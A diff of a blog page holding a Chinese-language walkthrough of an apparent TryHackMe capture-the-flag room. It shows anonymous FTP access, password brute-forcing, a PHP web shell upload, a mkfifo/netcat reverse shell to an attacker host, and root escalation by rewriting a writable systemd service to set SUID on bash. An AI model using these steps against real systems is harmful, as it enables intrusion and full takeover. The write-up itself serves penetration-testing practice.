@@ -1,17 +1,18 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_IDE | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="IDE 题目描述：一个能轻松提升你的计数技巧的工具！  端口扫描 开放了21，22，80，还有一个 62337   先访问 80 端口，啥也没有…  再看 62337 端口，是一个登录页面 尝试弱口令爆破密码，不行  再尝试 ftp，发现可以匿名登录，ls 列出目录，在 ... 目录下发现文件 - get 下载文件，是 drac 发给 john 的邮件，大概内容是把 john 的密码修改成了默认密">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_IDE | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="IDE 题目描述：一个能轻松提升你的计数技巧的工具！  端口扫描  访问网站，啥也没有…  再看 62337 端口，是一个登录页面 尝试弱口令爆破密码，不行  再尝试 ftp，发现可以匿名登录，在 ... 目录下发现文件 - 下载文件，是 drac 发给 john 的邮件，大概内容是把 john 的密码修改成了默认密码，以及关心图像文件 C:\Users\25189\Desktop&gt;ftp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TryHackMe_IDE">
 <meta property="og:url" content="https://x9wd09ncc.github.io/post/TyrHackMe_IDE.html">
 <meta property="og:site_name" content="X9wd09ncc">
-<meta property="og:description" content="IDE 题目描述：一个能轻松提升你的计数技巧的工具！  端口扫描 开放了21，22，80，还有一个 62337   先访问 80 端口，啥也没有…  再看 62337 端口，是一个登录页面 尝试弱口令爆破密码，不行  再尝试 ftp，发现可以匿名登录，ls 列出目录，在 ... 目录下发现文件 - get 下载文件，是 drac 发给 john 的邮件，大概内容是把 john 的密码修改成了默认密">
+<meta property="og:description" content="IDE 题目描述：一个能轻松提升你的计数技巧的工具！  端口扫描  访问网站，啥也没有…  再看 62337 端口，是一个登录页面 尝试弱口令爆破密码，不行  再尝试 ftp，发现可以匿名登录，在 ... 目录下发现文件 - 下载文件，是 drac 发给 john 的邮件，大概内容是把 john 的密码修改成了默认密码，以及关心图像文件 C:\Users\25189\Desktop&gt;ftp">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
 <meta property="article:published_time" content="2026-05-11T09:37:28.000Z">
-<meta property="article:modified_time" content="2026-05-15T06:41:56.449Z">
+<meta property="article:modified_time" content="2026-05-17T10:32:24.315Z">
 <meta property="article:author" content="X9wd09ncc">
 <meta property="article:tag" content="thm">
 <meta property="article:tag" content="easy">
 <meta property="article:tag" content="红队">
+<meta property="article:tag" content="vsftpd">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TyrHackMe_IDE.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
@@ -60,7 +61,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2026-05-15 14:41:56'
+  postUpdate: '2026-05-17 18:32:24'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -173,19 +174,18 @@ window.addEventListener('load',()=> { preloader.endLoading() })
 if (false) {
   document.addEventListener('pjax:send', () => { preloader.initLoading() })
   document.addEventListener('pjax:complete', () => { preloader.endLoading() })
-}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_IDE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-11T09:37:28.000Z" title="发表于 2026-05-11 17:37:28">2026-05-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-15T06:41:56.449Z" title="更新于 2026-05-15 14:41:56">2026-05-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h1><blockquote>
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_IDE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-11T09:37:28.000Z" title="发表于 2026-05-11 17:37:28">2026-05-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-17T10:32:24.315Z" title="更新于 2026-05-17 18:32:24">2026-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h1><blockquote>
 <p>题目描述：一个能轻松提升你的计数技巧的工具！</p>
 </blockquote>
 <p>端口扫描</p>
-<p>开放了21，22，80，还有一个 62337 </p>
 <p><img src="/../image/TryHackMe/easy/IDE/port_scan.png" alt="port_scan"></p>
-<p>先访问 80 端口，啥也没有…</p>
+<p>访问网站，啥也没有…</p>
 <p><img src="/../image/TryHackMe/easy/IDE/web.png" alt="web"></p>
-<p>再看 62337 端口，是一个登录页面</p>
+<p>再看 <code>62337</code> 端口，是一个登录页面</p>
 <p>尝试弱口令爆破密码，不行</p>
 <p><img src="/../image/TryHackMe/easy/IDE/port_62337.png" alt="port_62337"></p>
-<p>再尝试 ftp，发现可以匿名登录，ls 列出目录，在 <code>...</code> 目录下发现文件 <code>-</code></p>
-<p>get 下载文件，是 drac 发给 john 的邮件，大概内容是把 john 的密码修改成了默认密码，以及关心图像文件</p>
+<p>再尝试 <code>ftp</code>，发现可以匿名登录，在 <code>...</code> 目录下发现文件 <code>-</code></p>
+<p>下载文件，是 <code>drac </code>发给 <code>john</code> 的邮件，大概内容是把 <code>john</code> 的密码修改成了默认密码，以及关心图像文件</p>
 <pre class="line-numbers language-none"><code class="language-none">C:\Users\25189\Desktop&gt;ftp 10.145.157.34
 连接到 10.145.157.34。
 220 (vsFTPd 3.0.3)
@@ -212,24 +212,12 @@ ftp&gt; ls -al
 drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
 drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
 226 Directory send OK.
-ftp: 收到 181 字节，用时 0.01秒 36.20千字节&#x2F;秒。
-ftp&gt; get -
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for - (151 bytes).
-Hey john,
-I have reset the password as you have asked. Please use the default password to login.
-Also, please take care of the image file ;)
-- drac.
+ftp: 收到 181 字节，用时 0.01秒 36.20千字节&#x2F;秒。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-226 Transfer complete.
-ftp: 收到 154 字节，用时 1.37秒 0.11千字节&#x2F;秒。
-ftp&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>默认密码大概是一个弱密码，有了用户名尝试再次爆破</p>
-<p>成功得到密码 password</p>
+<p>默认密码大概是一个弱密码，有了用户名后尝试再次爆破</p>
+<p>成功得到密码 <code>password</code></p>
 <p><img src="/../image/TryHackMe/easy/IDE/password.png" alt="password"></p>
-<p>使用 john 和 password 登录</p>
-<p>进去有四个 py 文件</p>
+<p>使用 <code>john</code> 和 <code>password</code> 登录，·进去有四个 <code>py</code> 文件</p>
 <p><img src="/../image/TryHackMe/easy/IDE/condiad.png" alt="condiad"></p>
 <p>让 ai 分析一下有无利用点，好像没有</p>
 <table>
@@ -256,10 +244,10 @@ ftp&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <td align="center">服务器：监听端口，接收客户端画面，发送本地摄像头画面</td>
 </tr>
 </tbody></table>
-<p>后面在项目那里发现可以新建项目，好可以上传文件，上传一个<a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">单文件 PHP shell</a></p>
+<p>后面在项目那里发现可以新建项目，并且可以上传文件，上传一个<a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">单文件 PHP shell</a></p>
 <p><img src="/../image/TryHackMe/easy/IDE/shell.png" alt="shell"></p>
-<p>然后访问 shell.php，我的路径是 &#x2F;workspace&#x2F;ananda&#x2F;shell.php</p>
-<p>搜索 user.txt，但是没有查看权限</p>
+<p>然后访问  <code>/workspace/ananda/shell.php</code></p>
+<p>查看 <code>user.txt</code>，但是没有查看权限</p>
 <pre class="line-numbers language-none"><code class="language-none">www-data@ide: …&#x2F;workspace&#x2F;ananda # id
  uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
 
@@ -269,10 +257,10 @@ www-data@ide: …&#x2F;workspace&#x2F;ananda # find &#x2F; -name user.txt 2&gt;&
 www-data@ide: …&#x2F;workspace&#x2F;ananda # cat &#x2F;home&#x2F;drac&#x2F;user.txt
 cat: &#x2F;home&#x2F;drac&#x2F;user.txt: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>进入 drac 用户目录，列出该用户下文件，发现对 .bash_history 有可读权限</p>
-<p>cat 查看发现 mysql 登录口令，包含账号密码</p>
-<p>尝试登录 mysql，发现没有这玩意</p>
-<p>考虑到用户名都是 drac，猜测 drac 用户的密码和 mysql 的密码是相同的</p>
+<p>进入 <code>drac</code> 用户目录，列出该用户下文件，发现对 <code>.bash_history</code> 有可读权限</p>
+<p><code>cat</code> 查看发现 <code>mysql</code> 登录口令，包含账号密码</p>
+<p>尝试登录<code> mysql</code>，发现没有这玩意</p>
+<p>考虑到用户名都是 <code>drac</code>，猜测 <code>drac</code> 用户的密码和 <code>mysql</code> 的密码是相同的</p>
 <pre class="line-numbers language-none"><code class="language-none">www-data@ide:…&#x2F;www&#x2F;html# cd &#x2F;home&#x2F;drac
 
 www-data@ide:&#x2F;home&#x2F;drac# ls -al
@@ -298,8 +286,8 @@ mysql -u drac -p &#39;Th3dRaCULa1sR3aL&#39;
 www-data@ide:&#x2F;home&#x2F;drac# mysql -u drac -p &#39;Th3dRaCULa1sR3aL&#39;
 sh: 1: mysql: not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>由于这个 shell 是文件 shell，无法输入密码，所以需要反弹 shell 并且创建一个伪终端</p>
-<p>里面有 nc，利用 nc 来反弹 shell，-e 命令没有，那就换一种方式</p>
+<p>由于这个是网页 <code>shell</code>，无法输入密码，所以需要反弹 <code>shell</code> 并且创建一个伪终端</p>
+<p>利用 <code>python + nc</code> 反弹</p>
 <pre class="line-numbers language-none"><code class="language-none">www-data@ide:&#x2F;home&#x2F;drac# which nc
 &#x2F;bin&#x2F;nc
 
@@ -312,8 +300,8 @@ usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
 
 www-data@ide:&#x2F;home&#x2F;drac# mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.xxx.xxx 4444 &gt;&#x2F;tmp&#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>本机 nc 监听，用 script 创建一个伪终端</p>
-<p>输入 drac 的账号密码，成功得到 use.txt</p>
+<p>本机监听，用 <code>script</code> 创建一个伪终端</p>
+<p>输入  <code>mysql</code> 的密码，成功得到切换用户</p>
 <pre class="line-numbers language-none"><code class="language-none">D:\netcat&gt;nc64.exe -lvvp 4444
 listening on [any] 4444 ...
 10.145.157.34: inverse host lookup failed: h_errno 11004: NO_DATA
@@ -327,7 +315,7 @@ Password: Th3dRaCULa1sR3aL
 drac@ide:~$ cat &#x2F;home&#x2F;drac&#x2F;user.txt
 02930d21a8eb009f6d26361b2d24a466<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>sudo -l 发现可以 root 执行 vsftpd 的重启</p>
+<p><code>sudo -l</code> 发现可以以 <code>root</code> 执行 <code>vsftpd</code> 的重启</p>
 <pre class="line-numbers language-none"><code class="language-none">drac@ide:~$ sudo -l
 [sudo] password for drac: Th3dRaCULa1sR3aL
 
@@ -339,7 +327,7 @@ User drac may run the following commands on ide:
     (ALL : ALL) &#x2F;usr&#x2F;sbin&#x2F;service vsftpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>先查看该程序的状态</p>
-<p>它加载了 &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service 文件</p>
+<p>它加载了 <code>/lib/systemd/system/vsftpd.service</code> 文件</p>
 <pre class="line-numbers language-none"><code class="language-none">drac@ide:&#x2F;tmp$ systemctl status vsftpd
 鈼?vsftpd.service - vsftpd FTP server
    Loaded: loaded (&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service; enabled; vendor preset: enabled)
@@ -350,13 +338,13 @@ User drac may run the following commands on ide:
    CGroup: &#x2F;system.slice&#x2F;vsftpd.service
            鈹斺攢14790 &#x2F;usr&#x2F;sbin&#x2F;vsftpd &#x2F;etc&#x2F;vsftpd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>ls 加载的文件，发现有写入的权限</p>
+<p>发现有写入的权限</p>
 <pre class="line-numbers language-none"><code class="language-none">drac@ide:&#x2F;tmp$ ls -al &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service
 ls -al &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service
 -rw-rw-r-- 1 root drac 248 Aug  4  2021 &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>cat 查看该文件</p>
-<p>ExecStartPre 键是服务启动前置执行命令</p>
+<p>查看该文件</p>
+<p><code>ExecStartPre</code> 键是服务启动前置执行命令</p>
 <pre class="line-numbers language-none"><code class="language-none">drac@ide:&#x2F;tmp$ cat  &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service
 [Unit]
 Description&#x3D;vsftpd FTP server
@@ -371,7 +359,7 @@ ExecStartPre&#x3D;-&#x2F;bin&#x2F;mkdir -p &#x2F;var&#x2F;run&#x2F;vsftpd&#x2F;e
 [Install]
 WantedBy&#x3D;multi-user.target<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>printf 修改 ExecStartPre&#x3D;&#x2F;bin&#x2F;chmod +s &#x2F;bin&#x2F;bash</p>
+<p>修改<code> ExecStartPre=/bin/chmod +s /bin/bash</code></p>
 <pre class="line-numbers language-none"><code class="language-none">drac@ide:&#x2F;tmp$ printf &#39;[Unit]\nDescription&#x3D;vsftpd FTP server\nAfter&#x3D;network.target\n\n[Service]\nType&#x3D;simple\nExecStartPre&#x3D;&#x2F;bin&#x2F;chmod +s &#x2F;bin&#x2F;bash\nExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;vsftpd &#x2F;etc&#x2F;vsftpd.conf\nExecReload&#x3D;&#x2F;bin&#x2F;kill -HUP $MAINPID\n\n[Install]\nWantedBy&#x3D;multi-user.target\n&#39; &gt; &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service
 &lt;user.target\n&#39; &gt; &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;vsftpd.service
 
@@ -389,7 +377,7 @@ ExecReload&#x3D;&#x2F;bin&#x2F;kill -HUP $MAINPID
 [Install]
 WantedBy&#x3D;multi-user.target<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>修改完后直接重启 vsftpd，然后用 bash -p 提权</p>
+<p>修改完后直接重启 <code>vsftpd</code>，然后用 <code>bash -p</code> 提权</p>
 <pre class="line-numbers language-none"><code class="language-none">drac@ide:&#x2F;tmp$ sudo &#x2F;usr&#x2F;sbin&#x2F;service vsftpd restart
 Warning: The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run &#39;systemctl daemon-reload&#39; to reload units.
 
@@ -404,4 +392,4 @@ bash-4.4# find &#x2F; -name root.txt 2&gt;&#x2F;dev&#x2F;null
 bash-4.4# cat &#x2F;root&#x2F;root.txt
 ce258cb16f47f1c66f0b0b77f4e0fb8d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TyrHackMe_IDE.html">https://x9wd09ncc.github.io/post/TyrHackMe_IDE.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Creative.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Creative</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Library.html" title="TryHackMe_Library"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Library</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_tomghost</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break Out The Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break Out The Cage</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TyrHackMe_IDE.html">https://x9wd09ncc.github.io/post/TyrHackMe_IDE.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/vsftpd/">vsftpd</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" 